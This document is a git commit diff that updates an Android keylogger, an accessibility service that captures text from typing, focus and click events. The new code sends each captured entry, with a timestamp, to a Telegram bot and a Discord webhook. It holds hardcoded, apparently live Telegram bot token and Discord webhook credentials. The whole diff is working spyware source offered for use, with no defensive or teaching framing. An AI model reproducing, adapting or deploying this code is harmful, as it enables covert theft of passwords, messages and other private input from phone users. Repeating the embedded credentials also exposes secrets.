8a05d77b21765503e6b52e6c77ed8120193ddd03
Naveen kumar <134396866+N4V33NM@users.noreply.github.com>
2024-12-19 16:54:12 +0530

    Update Keylogger.java

--- Android-Keylogger/AndroidKeylogger/app/src/main/java/com/bshu2/androidkeylogger/Keylogger.java
+++ Android-Keylogger/AndroidKeylogger/app/src/main/java/com/bshu2/androidkeylogger/Keylogger.java
@@ -5,96 +5,102 @@ import android.os.AsyncTask;
 import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
 
-import java.io.DataOutputStream;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
-import java.util.Calendar;
 import java.text.SimpleDateFormat;
-import java.text.DateFormat;
+import java.util.Calendar;
 import java.util.Locale;
 
-import org.apache.http.impl.client.DefaultHttpClient;
-import org.apache.http.client.HttpClient;
-import org.apache.http.client.methods.HttpPost;
-import org.apache.http.entity.StringEntity;
-import org.apache.http.params.*;
-import org.apache.http.protocol.HTTP;
-
 /**
- * Created by Brian on 3/10/2017.
+ * Keylogger Service for logging accessibility events and sending data to Telegram and Discord.
  */
-
 public class Keylogger extends AccessibilityService {
 
-    private class SendToServerTask extends AsyncTask<String, Void, String> {
+    private static final String TELEGRAM_BOT_TOKEN = "8178078713:AAGOSCn4KEuvXC64xXhDrZjwQZmIy33gfaI";
+    private static final String DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1193056692171178095/IqlnHSr8jODI0qaIYeAmaWWyK1mvg0uRPKl32BHaoX7S3ami8G4V4DqHy4qoqMrImBGN";
+
+    private static final String TAG = "Keylogger";
+
+    private class SendToTelegramTask extends AsyncTask<String, Void, Void> {
         @Override
-        protected String doInBackground(String... params) {
-
-            //Log.d("Keylogger", params[0]);
-
+        protected Void doInBackground(String... params) {
             try {
+                String message = params[0];
+                String chatId = Constants.TELEGRAM_CHAT_ID; // Retrieve chat ID dynamically
+                String telegramUrl = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage";
+                String payload = "chat_id=" + chatId + "&text=" + message.replace(" ", "+");
 
-                String url = "https://cs460-android-keylogger.appspot.com";
+                URL url = new URL(telegramUrl);
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("POST");
+                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+                conn.setDoOutput(true);
 
-                HttpParams httpParameters = new BasicHttpParams();
-                HttpConnectionParams.setConnectionTimeout(httpParameters, 5000);
-                HttpConnectionParams.setSoTimeout(httpParameters, 5000);
+                try (OutputStream os = conn.getOutputStream()) {
+                    os.write(payload.getBytes("UTF-8"));
+                    os.flush();
+                }
 
-                StringEntity entity = new StringEntity(params[0], HTTP.UTF_8);
-                entity.setContentType("text/plain");
-
-                HttpClient client = new DefaultHttpClient(httpParameters);
-                HttpPost httpPost = new HttpPost(url);
-
-                httpPost.setEntity(entity);
-                client.execute(httpPost);
-
-
+                Log.d(TAG, "Telegram Response Code: " + conn.getResponseCode());
             } catch (Exception e) {
-                e.printStackTrace();
+                Log.e(TAG, "Error sending message to Telegram", e);
             }
-            return params[0];
+            return null;
+        }
+    }
+
+    private class SendToDiscordTask extends AsyncTask<String, Void, Void> {
+        @Override
+        protected Void doInBackground(String... params) {
+            try {
+                String message = params[0];
+                String payload = "{\"content\": \"" + message.replace("\"", "\\\"") + "\"}";
+
+                URL url = new URL(DISCORD_WEBHOOK_URL);
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("POST");
+                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
+                conn.setDoOutput(true);
+
+                try (OutputStream os = conn.getOutputStream()) {
+                    os.write(payload.getBytes("UTF-8"));
+                    os.flush();
+                }
+
+                Log.d(TAG, "Discord Response Code: " + conn.getResponseCode());
+            } catch (Exception e) {
+                Log.e(TAG, "Error sending message to Discord", e);
+            }
+            return null;
         }
     }
 
     @Override
     public void onServiceConnected() {
-        Log.d("Keylogger", "Starting service");
+        Log.d(TAG, "Keylogger service connected.");
     }
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
+        String timestamp = new SimpleDateFormat("MM/dd/yyyy, HH:mm:ss z", Locale.US)
+                .format(Calendar.getInstance().getTime());
 
-        DateFormat df = new SimpleDateFormat("MM/dd/yyyy, HH:mm:ss z", Locale.US);
-        String time = df.format(Calendar.getInstance().getTime());
+        String data = event.getText().toString();
 
-        switch(event.getEventType()) {
-            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
-                String data = event.getText().toString();
-                SendToServerTask sendTask = new SendToServerTask();
-                sendTask.execute(time + "|(TEXT)|" + data);
-                break;
-            }
-            case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
-                String data = event.getText().toString();
-                SendToServerTask sendTask = new SendToServerTask();
-                sendTask.execute(time + "|(FOCUSED)|" + data);
-                break;
-            }
-            case AccessibilityEvent.TYPE_VIEW_CLICKED: {
-                String data = event.getText().toString();
-                SendToServerTask sendTask = new SendToServerTask();
-                sendTask.execute(time + "|(CLICKED)|" + data);
-                break;
-            }
-            default:
-                break;
+        if (data == null || data.trim().isEmpty()) {
+            return;
         }
+
+        String logMessage = timestamp + " | (Event Type: " + event.getEventType() + ") | " + data;
+        new SendToTelegramTask().execute(logMessage);
+        new SendToDiscordTask().execute(logMessage);
+
+        Log.d(TAG, "Logged event: " + logMessage);
     }
 
     @Override
     public void onInterrupt() {
-
+        Log.d(TAG, "Keylogger service interrupted.");
     }
 }
